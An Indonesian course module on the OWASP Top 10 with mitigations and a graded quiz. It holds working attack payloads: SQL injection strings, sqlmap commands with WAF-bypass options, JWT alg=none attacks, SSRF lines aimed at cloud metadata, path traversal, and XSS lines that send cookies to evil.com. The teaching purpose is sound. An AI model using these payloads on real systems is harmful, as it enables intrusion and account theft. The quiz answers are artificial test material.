A01:2025

Broken Access Control — Kerentanan Paling Umum

Kontrol akses yang tidak tepat memungkinkan pengguna bertindak di luar izin yang diberikan | CWE-200, CWE-862

Pola Utama Kerentanan

1. IDOR — Insecure Direct Object Reference

URL mengekspos referensi langsung ke objek internal (ID, filename) tanpa verifikasi kepemilikan.

# Rentan: User A mengakses data User B GET /api/orders/1234 ← ID order user lain GET /profile?id=99 ← Cukup ubah angka ID GET /download?file=report_user99.pdf

2. Privilege Escalation Horizontal & Vertikal

  • Horizontal: User A mengakses resource milik User B (level sama)
  • Vertikal: User biasa mengakses fungsi admin (naik level)
  • Contoh: parameter role=admin yang dapat dimanipulasi di request

3. Path Traversal & Force Browsing

  • ../../../etc/passwd — akses file sistem
  • Akses langsung ke URL admin tanpa login: /admin/users
  • CORS misconfiguration memungkinkan cross-origin read

Pengujian & Mitigasi

Cara Menguji IDOR
# 1. Login sebagai user A, catat resource ID-nya GET /api/user/1001/profile # 2. Login sebagai user B, coba akses ID milik A GET /api/user/1001/profile ← Apakah berhasil? # 3. Gunakan Burp Suite Repeater untuk systematic test # 4. Coba ID: sequential (1000, 1001), UUID, hash 200 OK ← IDOR ditemukan! 403 Forbidden ← Kontrol akses benar

Mitigasi Standar:

  • Terapkan RBAC/ABAC di sisi server — jangan percaya input user
  • Deny-by-default: semua resource dilarang kecuali eksplisit diizinkan
  • Gunakan indirect reference maps (UUID, bukan ID sekuensial)
  • Log semua access control failure dan alert bila threshold terlampaui
  • Uji kontrol akses dalam automated tests (unit + integration)
CWE-200 CWE-862 OWASP A01:2025 NICE K0119
A03:2025 — Injection

Injection — SQL Injection, NoSQLi, SSTI, Command Injection

Terjadi ketika data tidak terpercaya dikirim ke interpreter sebagai bagian dari perintah atau query | CWE-89

SQL Injection — Mekanisme Dasar

Query rentan tanpa parameterisasi:

// Kode PHP RENTAN $id = $_GET['id']; $query = "SELECT * FROM users WHERE id = $id"; // Input attacker: 1 OR 1=1-- // Query jadi: SELECT * FROM users WHERE id = 1 OR 1=1-- // Hasilnya: semua data user terdump!

Jenis SQL Injection

  • In-band SQLi: Hasil langsung terlihat di response (Classic, Error-based)
  • Inferential (Blind) SQLi: Tidak ada output langsung — pakai Boolean-based atau Time-based
  • Out-of-band SQLi: Data dikirim via DNS/HTTP ke server attacker
Dampak SQLi Berhasil

Authentication bypass • Data exfiltration • Database corruption • Remote Code Execution (xp_cmdshell pada SQL Server) • Credential harvesting

Payload SQLi Umum

-- Bypass login (Classic) admin'-- ' OR '1'='1 ' OR 1=1-- -- Error-based: ambil versi DB 1 AND extractvalue(1,concat(0x7e,version())) -- UNION-based: dump tabel 1 UNION SELECT 1,table_name,3 FROM information_schema.tables-- -- Boolean-based Blind 1 AND 1=1 (True → response normal) 1 AND 1=2 (False → response berbeda) -- Time-based Blind (MySQL) 1; IF(1=1, SLEEP(5), 0)-- 1 AND SLEEP(5)--
Mitigasi SQLi

Gunakan Prepared Statements / Parameterized Queries — bukan string concatenation. Tambahkan WAF sebagai lapisan pertahanan tambahan, tapi bukan pengganti.

// AMAN — Prepared Statement PHP PDO $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$_GET['id']]);
A03:2025 — SQLi Lanjutan

Blind SQL Injection & Otomasi dengan SQLMap

Teknik eksploitasi ketika tidak ada output langsung — dan penggunaan tools otomasi secara etis

Boolean-Based Blind SQLi

Inferensi data dari perbedaan respons True/False:

# Pertanyaan: apakah karakter pertama nama DB = 'd'? ?id=1 AND SUBSTRING(database(),1,1)='d' # True → respons normal | False → respons berbeda # Ekstrak nama database karakter per karakter ?id=1 AND SUBSTRING(database(),1,1)='a' → False ?id=1 AND SUBSTRING(database(),1,1)='d' → True ← ?id=1 AND SUBSTRING(database(),2,1)='v' → True ← # Hasil: database name = "dvwa"

Time-Based Blind SQLi

Ketika tidak ada perbedaan visual dalam respons — gunakan delay waktu:

?id=1; IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)-- # Jika DB name dimulai 'd' → server delay 5 detik

SQLMap — Otomasi Pengujian SQLi

Etika Penggunaan

SQLMap HANYA boleh digunakan pada sistem yang Anda miliki atau sistem yang telah mendapat izin pengujian tertulis. Penggunaan tanpa izin adalah tindakan ilegal.

# Dasar: uji URL untuk SQLi sqlmap -u "http://target/page.php?id=1" --dbs # Dump tabel dari database tertentu sqlmap -u "http://target/page.php?id=1" \ -D dvwa -T users --dump # Bypass WAF dengan teknik encoding sqlmap -u "http://target/?id=1" \ --tamper=space2comment --level=5 --risk=3 # Gunakan Burp request file sqlmap -r request.txt --batch [*] Starting SQLMap v1.8.x [INFO] testing 'MySQL >= 5.0.12 AND time-based blind' [INFO] Parameter 'id' is vulnerable
XSS — A03 & A07 Terkait

Cross-Site Scripting (XSS) — Reflected, Stored, DOM

Injeksi skrip berbahaya ke halaman web yang dijalankan di browser korban | CWE-79

Tiga Jenis XSS

1. Reflected XSS

Payload dalam URL/parameter langsung di-reflect ke halaman tanpa disimpan. Membutuhkan korban mengklik link berbahaya.

# URL berbahaya yang dikirim ke korban: https://target.com/search?q=<script> document.location='https://evil.com/steal?c='+document.cookie </script>

2. Stored XSS (Persistent)

Payload tersimpan di database server dan dieksekusi setiap kali halaman dimuat. Lebih berbahaya — tidak membutuhkan interaksi langsung.

Contoh: komentar di blog, profil pengguna, pesan forum yang mengandung script.

3. DOM-Based XSS

Payload diproses oleh JavaScript sisi klien tanpa interaksi server. Sumber: location.hash, document.URL, document.referrer.

Payload XSS & Bypass Filter

-- Payload dasar <script>alert('XSS')</script> -- Bypass filter tag script <img src=x onerror="alert('XSS')"> <svg onload="alert(1)"> <body onload=alert(1)> -- Cookie stealing <script>fetch('https://evil.com/?c='+btoa(document.cookie))</script> -- Bypass HTML encoding <script>alert(1)</script> %3Cscript%3Ealert(1)%3C%2Fscript%3E

Dampak XSS: Session hijacking • Account takeover • Keylogging • Phishing • BeEF browser exploitation • Defacement

Mitigasi XSS
  • Output encoding sesuai konteks (HTML, JS, URL)
  • Content Security Policy (CSP) header
  • Input validation + DOMPurify untuk sanitasi
  • HttpOnly & Secure flag pada cookie
A07:2025

Identification & Authentication Failures

Kelemahan mekanisme autentikasi memungkinkan compromise identity pengguna atau sesi | CWE-287, CWE-306

Pola Kerentanan Autentikasi

Credential Stuffing & Brute Force

  • Tidak ada rate limiting atau account lockout
  • Attacker gunakan daftar credential bocor (RockYou, HaveIBeenPwned)
  • Tools: Hydra, Burp Intruder, ffuf

Weak / Default Credentials

  • Admin/admin, root/root, password masih digunakan
  • Password disimpan dalam plaintext atau MD5 tanpa salt
  • Tidak enforce password complexity atau rotation policy

Session Management yang Lemah

  • Session ID yang predictable atau pendek
  • Session tidak diinvalidasi saat logout
  • Session fixation — ID tidak berubah setelah login
  • Token JWT dengan algoritma none atau RS256→HS256

JWT Attack & Mitigasi

# JWT Algorithm Confusion Attack # Header asli: {"alg":"RS256","typ":"JWT"} # Attacker ubah ke: {"alg":"none","typ":"JWT"} # Hapus signature → server terima jika tidak divalidasi # Decode JWT tanpa library: echo "eyJhbGciOiJub25lIn0" | base64 -d {"alg":"none"} # Tool: jwt_tool untuk pengujian JWT python3 jwt_tool.py [JWT] -X a # alg=none attack python3 jwt_tool.py [JWT] -X n # null sig attack
Implementasi Autentikasi yang Aman
  • Wajibkan MFA untuk akun privileged
  • Rate limiting + CAPTCHA pada endpoint login
  • Session ID panjang, acak, invalidasi saat logout
  • Validasi JWT dengan library resmi, tolak alg=none
  • Password hashing dengan bcrypt/Argon2, bukan MD5/SHA1
A02 & A05:2025

Cryptographic Failures & Security Misconfiguration

Dua kategori yang sering diabaikan namun mudah dieksploitasi

A02 — Cryptographic Failures

Skenario Kerentanan Umum

  • Transmisi data sensitif lewat HTTP (tidak terenkripsi)
  • Password disimpan dengan hashing lemah: MD5, SHA1 tanpa salt
  • Kunci API/secret token di-commit ke repository publik
  • Protokol TLS usang: TLS 1.0/1.1, SSL 2.0/3.0
  • Sertifikat SSL expired atau self-signed tanpa validasi
Pengujian Cryptographic Failures
# Cek konfigurasi TLS dengan testssl.sh ./testssl.sh https://target.com # Deteksi protocol lemah nmap --script ssl-enum-ciphers -p 443 target.com # Cek header security di respons HTTP curl -I https://target.com | grep -i "strict\|hsts"

A05 — Security Misconfiguration

Skenario Umum

  • Default credentials: admin/admin tidak diganti setelah install
  • Directory listing: /uploads/ bisa dibrowse langsung
  • Verbose error messages: stack trace, SQL error tampil ke user
  • Debug mode aktif di production (Django DEBUG=True)
  • Cloud misconfiguration: S3 bucket publik, Azure Blob terbuka
Insiden Nyata — A05

Twitch (2021): 125GB source code + data gaji bocor akibat server misconfiguration. Capital One (2019): $80M denda akibat SSRF + IAM misconfiguration di AWS.

Pencegahan

Terapkan hardening baseline (CIS Benchmarks), hapus default accounts, nonaktifkan fitur yang tidak diperlukan, scan rutin dengan Nikto dan Nuclei.

Ikhtisar A06–A10

Komponen Rentan, Integrity Failures, SSRF & Logging

Empat kategori OWASP Top 10 yang saling melengkapi dalam attack chain modern

A06 — Vulnerable & Outdated Components

Penggunaan library/framework/OS dengan CVE yang diketahui:

  • Log4Shell (CVE-2021-44228) — RCE via Apache Log4j2
  • Spring4Shell (CVE-2022-22965) — RCE via Spring Framework
  • Deteksi: npm audit, pip-audit, Dependency-Check (OWASP)

A08 — Software & Data Integrity Failures

  • CI/CD pipeline tidak tervalidasi → supply chain attack
  • Insecure deserialization: Java, PHP, Python pickle
  • Update software tanpa verifikasi signature/checksum
  • Insiden: SolarWinds (2020), 3CX supply chain (2023)

A09 — Security Logging & Monitoring Failures

  • Login failure tidak dicatat → credential stuffing tidak terdeteksi
  • Tidak ada alert saat anomali (login jam 3 pagi dari negara asing)
  • Log disimpan di lokasi yang tidak secure atau mudah dihapus
  • Mean Time to Detect (MTTD) rata-rata: 207 hari (IBM 2023)

A10 — Server-Side Request Forgery (SSRF)

Aplikasi mengambil resource dari URL yang dikontrol attacker — menyebabkan akses ke internal service:

# Input user yang diproses server: url=http://169.254.169.254/latest/meta-data/ ← AWS metadata url=http://localhost:8080/admin ← Internal admin url=file:///etc/passwd ← Local file read

Digunakan dalam Capital One breach (2019) untuk akses AWS IAM credentials via EC2 metadata service.

5 soal pilihan ganda · Sub-CPMK 263.1

Soal 1 dari 5
Seorang pengguna menemukan URL /api/invoice/1042 dapat diubah menjadi /api/invoice/1041 untuk mengakses faktur pengguna lain. Kerentanan OWASP Top 10 2025 apa yang paling sesuai?
Benar! IDOR (Insecure Direct Object Reference) adalah sub-kategori dari A01 — Broken Access Control. Pengguna mengakses objek milik orang lain dengan memanipulasi identifier langsung.
Kurang tepat. Mengubah ID di URL untuk mengakses data orang lain adalah IDOR — sub-kategori A01 Broken Access Control, bukan injection atau authentication.
Soal 2 dari 5
Payload SQLi mana yang paling tepat untuk mendeteksi Time-Based Blind SQL Injection pada MySQL?
Benar! SLEEP(5) menyebabkan delay 5 detik jika query berhasil dieksekusi — ini adalah tanda Time-Based Blind SQLi. Tidak ada output langsung, tapi waktu respons berubah.
Kurang tepat. Time-based Blind SQLi menggunakan fungsi delay seperti SLEEP(5) di MySQL — jika server merespons lambat, artinya payload dieksekusi.
Soal 3 dari 5
Manakah dari berikut ini yang merupakan karakteristik Stored XSS yang membedakannya dari Reflected XSS?
Benar! Stored XSS menyimpan payload di database server (misalnya di komentar/profil), sehingga menyerang SEMUA pengguna yang mengakses halaman tersebut — jauh lebih berbahaya dari Reflected XSS.
Kurang tepat. Perbedaan utama: Stored XSS menyimpan payload di server dan mengeksekusinya ke semua pengunjung. Reflected XSS membutuhkan korban mengklik link khusus setiap kali.
Soal 4 dari 5
Seorang developer menyimpan password pengguna menggunakan fungsi MD5($password) tanpa salt. Mitigasi yang paling tepat adalah…
Benar! MD5 dan SHA-256 adalah hashing fungsi umum — tidak dirancang untuk password. Gunakan Argon2 (pemenang PHC 2015) atau bcrypt yang memiliki cost factor dan salt built-in, dirancang khusus untuk password hashing.
Kurang tepat. Base64/AES bukan solusi — gunakan fungsi hash yang memang dirancang untuk password: Argon2, bcrypt, atau scrypt dengan salt otomatis dan cost factor tinggi.
Soal 5 dari 5
Insiden Capital One (2019) yang menyebabkan kebocoran 100 juta data nasabah memanfaatkan kerentanan OWASP apa?
Benar! Attacker mengeksploitasi SSRF pada WAF server Capital One untuk mengakses 169.254.169.254 (AWS EC2 metadata service), mendapatkan IAM credentials, lalu mengakses data S3 bucket — kombinasi A10 SSRF + A05 Misconfiguration.
Kurang tepat. Capital One breach menggunakan SSRF (A10) untuk mengakses AWS metadata service dan mendapatkan IAM credentials — salah satu insiden SSRF paling terkenal di cloud era.
